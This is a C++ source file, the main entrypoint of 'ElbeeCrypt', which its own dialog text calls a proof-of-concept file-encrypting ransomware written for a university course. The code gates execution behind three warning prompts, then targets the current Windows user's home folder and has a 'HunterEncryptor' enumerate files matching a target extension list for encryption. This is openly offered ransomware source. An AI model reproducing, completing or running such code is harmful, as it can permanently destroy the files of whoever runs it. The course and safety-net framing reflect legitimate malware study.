#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
#include "elbeecrypt/cryptor/main.hpp"

#include "elbeecrypt/common/settings.hpp"
#include "elbeecrypt/common/targets/extensions.hpp"
#include "elbeecrypt/common/utils/fs.hpp"
#include "elbeecrypt/common/utils/string.hpp"


//Platform-specific includes
#if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
	//Definitions
	#define WINDOWS_PLATFORM
	#define WIN32_LEAN_AND_MEAN
	#include <windows.h>
#else
	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
#endif

namespace fs = std::filesystem;
using namespace elbeecrypt;
using namespace std;

void writeTo(fs::path path, std::string content){
	std::ofstream file;
	file.open(path, std::ios_base::app);
	file << content << "\n";
	file.close();
}

/** 
 * Main entrypoint for ElbeeCrypt's cryptor binary. 
 * 
 * @param argc The number of arguments
 * @param argv The arguments themselves
 * @return The status code on conclusion of execution
 */
int main(int argc, char **argv){
	//Deploy the safety net before continuing
	if(common::Settings::SAFETY_NET == true){
		if(!cryptor::Main::safetyNet()) exit(-1);
	}

	cout << "Encryption routines started!" << endl;


	//Set the base path
	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
	std::cout << "Path: " << basePath << std::endl;



	cryptor::HunterEncryptor h = cryptor::HunterEncryptor({basePath});
	//elbeecrypt::common::io::Hunter h({basePath});

	std::cout << h.toString() << std::endl;

	std::cout << "Targets:" << std::endl;
	for(fs::path item : h.getTargets()){
		std::cout << "\t" << item.string() << std::endl;
	}



	/*
	for(fs::path path : paths){
		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
	}
	*/
}

/** Impl of safetyNet(). */
bool cryptor::Main::safetyNet(){
	//First prompt with info about the program
	int promptOne = MessageBox(
		NULL,
		"Welcome to ElbeeCrypt: A PoC file-encrypting ransomware for CECS-378. \n\nMade by Josh, Jaxon, Valeria, Nathanael, David, Alvin, and Robin \n\nWARNING: This is a live file encrypting ransomware. While this sample doesn't destroy encryption keys like other ransomware, things can go haywire if the keys are lost or damaged or you delete the encrypted files. We are not responsible for any damage to your files or system. DO NOT PROCEED UNLESS YOU ARE OKAY WITH PERMANENT DAMAGE TO YOUR FILES. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONASTERISK | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptOne == IDCANCEL) return false; //Gate one

	//Second prompt with further warning
	int promptTwo = MessageBox(
		NULL,
		"This ransomware sample, like other ransomware, CAN DESTROY YOUR PERSONAL FILES PERMANENTLY. Unless configured otherwise, this sample will recursively hunt out EVERY TARGET file in \"C:\\Users\\\", meaning any file in that directory that matches the target extension list WILL BE ENCRYPTED! \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptTwo == IDCANCEL) return false; //Gate two

	//Third prompt with a final warning
	int promptThree = MessageBox(
		NULL,
		"LAST WARNING: THIS SAMPLE CAN DESTROY YOUR FILES!!!!!! As stated previously THE AUTHORS HOLD NO RESPONSIBILITY IF THIS OCCURS. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONERROR | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptThree == IDCANCEL) return false; //Gate three

	//No cancellations, so return true be default
	return true;
}